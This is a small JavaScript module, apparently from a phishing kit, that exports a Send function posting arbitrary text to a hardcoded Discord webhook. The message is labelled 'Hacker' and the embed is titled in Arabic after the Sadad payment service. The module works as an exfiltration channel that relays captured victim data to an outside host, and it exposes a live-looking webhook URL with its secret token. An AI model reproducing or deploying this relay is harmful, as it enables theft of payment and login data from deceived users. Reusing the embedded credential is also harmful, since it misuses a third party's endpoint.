import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323756450098577430/ELSCsYZ2EzjosNUUGP81KunJnoAOdsyFmvMi6KNa0Eyix6_dF7ydIydJu2Gez3uGhuJE",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
